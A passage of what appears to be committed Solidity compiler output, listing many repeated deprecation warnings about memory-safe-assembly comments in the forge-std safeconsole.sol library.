+     |
+1433 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1449:9:
+     |
+1449 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1462:9:
+     |
+1462 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1476:9:
+     |
+1476 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1489:9:
+     |
+1489 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1503:9:
+     |
+1503 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1516:9:
+     |
+1516 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1532:9:
+     |
+1532 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1555:9:
+     |
+1555 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1573:9:
+     |
+1573 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1596:9:
+     |
+1596 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1614:9:
+     |
+1614 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1637:9:
+     |
+1637 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1655:9:
+     |
+1655 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1678:9:
+     |
+1678 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1698:9:
+     |
+1698 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1724:9:
+     |
+1724 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1742:9:
+     |
+1742 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1755:9:
+     |
+1755 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1769:9:
+     |
+1769 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1782:9:
+     |
+1782 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1796:9:
+     |
+1796 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1809:9:
+     |
+1809 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1825:9:
+     |
+1825 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1848:9:
+     |
+1848 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1864:9:
+     |
+1864 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1877:9:
+     |
+1877 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1891:9:
+     |
+1891 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1904:9:
+     |
+1904 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1918:9:
+     |
+1918 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1931:9:
+     |
+1931 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1947:9:
+     |
+1947 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1970:9:
+     |
+1970 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1986:9:
+     |
+1986 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:1999:9:
+     |
+1999 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2013:9:
+     |
+2013 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2026:9:
+     |
+2026 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2040:9:
+     |
+2040 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2053:9:
+     |
+2053 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2069:9:
+     |
+2069 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2092:9:
+     |
+2092 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2110:9:
+     |
+2110 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2133:9:
+     |
+2133 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2151:9:
+     |
+2151 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2174:9:
+     |
+2174 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2192:9:
+     |
+2192 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2215:9:
+     |
+2215 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2235:9:
+     |
+2235 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2261:9:
+     |
+2261 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2281:9:
+     |
+2281 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2304:9:
+     |
+2304 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2322:9:
+     |
+2322 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2345:9:
+     |
+2345 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2363:9:
+     |
+2363 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2386:9:
+     |
+2386 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2406:9:
+     |
+2406 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2432:9:
+     |
+2432 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2452:9:
+     |
+2452 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2475:9:
+     |
+2475 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2493:9:
+     |
+2493 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2516:9:
+     |
+2516 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2534:9:
+     |
+2534 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2557:9:
+     |
+2557 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2577:9:
+     |
+2577 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2603:9:
+     |
+2603 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2623:9:
+     |
+2623 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2646:9:
+     |
+2646 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2664:9:
+     |
+2664 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2687:9:
+     |
+2687 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2705:9:
+     |
+2705 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2728:9:
+     |
+2728 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2748:9:
+     |
+2748 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2774:9:
+     |
+2774 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2796:9:
+     |
+2796 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2822:9:
+     |
+2822 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2844:9:
+     |
+2844 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2870:9:
+     |
+2870 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2892:9:
+     |
+2892 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2918:9:
+     |
+2918 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2942:9:
+     |
+2942 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2971:9:
+     |
+2971 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2992:9:
+     |
+2992 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3007:9:
+     |
+3007 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3023:9:
+     |
+3023 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3038:9:
+     |
+3038 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3054:9:
+     |
+3054 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3069:9:
+     |
+3069 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3087:9:
+     |
+3087 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3112:9:
+     |
+3112 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3130:9:
+     |
+3130 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3145:9:
+     |
+3145 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3161:9:
+     |
+3161 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3176:9:
+     |
+3176 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3192:9:
+     |
+3192 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3207:9:
+     |
+3207 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3225:9:
+     |
+3225 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3250:9:
+     |
+3250 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3268:9:
+     |
+3268 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3283:9:
+     |
+3283 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3299:9:
+     |
+3299 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3314:9:
+     |
+3314 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3330:9:
+     |
+3330 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3345:9:
+     |
+3345 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3363:9:
+     |
+3363 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3388:9:
+     |
+3388 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3408:9:
+     |
+3408 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3433:9:
+     |
+3433 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3453:9:
+     |
+3453 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3478:9:
+     |
+3478 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3498:9:
+     |
+3498 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3523:9:
+     |
+3523 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3545:9:
+     |
+3545 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
